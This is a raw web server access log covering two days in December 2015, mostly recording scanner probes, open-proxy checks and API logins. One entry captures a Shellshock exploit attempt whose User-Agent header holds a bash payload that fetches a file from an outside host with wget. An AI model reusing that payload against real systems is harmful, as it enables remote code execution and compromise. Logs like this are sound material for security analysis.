116.193.139.16 - - [30/Dec/2015:15:44:29 +0000] "GET /favicon.ico HTTP/1.1" 404 92 "-" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
116.193.139.16 - - [30/Dec/2015:15:44:29 +0000] "GET /favicon.ico HTTP/1.1" 404 92 "-" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
116.193.139.16 - - [30/Dec/2015:15:44:36 +0000] "GET /api HTTP/1.1" 404 92 "-" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
61.160.247.231 - - [30/Dec/2015:16:10:39 +0000] "GET /manager/html HTTP/1.1" 404 92 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)"
116.193.139.16 - - [30/Dec/2015:17:42:15 +0000] "POST /api/user/login HTTP/1.1" 200 445 "http://52.77.226.195/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
116.193.139.16 - - [30/Dec/2015:17:42:31 +0000] "GET /api/lab HTTP/1.1" 200 87 "http://52.77.226.195/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
116.193.139.16 - - [30/Dec/2015:17:42:45 +0000] "POST /api/lab HTTP/1.1" 200 108 "http://52.77.226.195/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
116.193.139.16 - - [30/Dec/2015:17:42:50 +0000] "GET /api/lab HTTP/1.1" 200 382 "http://52.77.226.195/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
104.219.238.10 - - [31/Dec/2015:01:00:23 +0000] "GET / HTTP/1.0" 404 92 "-" "-"
95.213.177.124 - - [31/Dec/2015:01:43:27 +0000] "POST http://check.proxyradar.com/azenv.php?auth=145152620805&a=PSCMN&i=877519555&p=8080 HTTP/1.1" 404 92 "https://proxyradar.com/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
85.25.74.174 - - [31/Dec/2015:02:36:48 +0000] "GET / HTTP/1.1" 404 92 "-" "libwww-perl/6.15"
202.109.143.18 - - [31/Dec/2015:10:08:09 +0000] "GET /manager/html HTTP/1.1" 404 92 "-" "Mozilla/3.0 (compatible; Indy Library)"
162.216.46.88 - - [31/Dec/2015:18:16:30 +0000] "GET http://prxs.mktrn.net/check_content HTTP/1.1" 404 92 "-" "Mozilla/5.0 (compatible; pycurl)"
190.145.38.2 - - [31/Dec/2015:18:17:23 +0000] "GET /cgi-bin/authLogin.cgi HTTP/1.1" 404 92 "-" "() { :; }; /bin/mkdir -p /share/HDB_DATA/.../ && /usr/bin/wget -q -c http://lliillii.altervista.org/io.php 0<&1 2>&1 "
27.255.67.132 - - [31/Dec/2015:19:45:30 +0000] "GET /manager/html HTTP/1.1" 404 92 "-" "Mozilla/3.0 (compatible; Indy Library)"
